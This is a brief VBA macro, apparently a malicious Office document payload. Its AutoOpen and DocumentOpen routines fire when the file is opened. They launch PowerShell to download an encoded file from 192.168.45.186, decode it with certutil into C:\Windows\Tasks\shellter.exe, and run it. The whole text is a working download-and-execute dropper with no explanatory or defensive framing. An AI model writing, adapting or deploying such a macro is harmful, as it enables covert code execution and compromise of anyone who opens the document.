 Sub mymacro()
    Dim Command As String
    Command = "powershell.exe iwr http://192.168.45.186/enc.txt -Outfile C:\Windows\Tasks\enc1.txt && certutil -decode C:\Windows\Tasks\enc1.txt C:\Windows\Tasks\shellter.exe && C:\Windows\Tasks\shellter.exe"
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
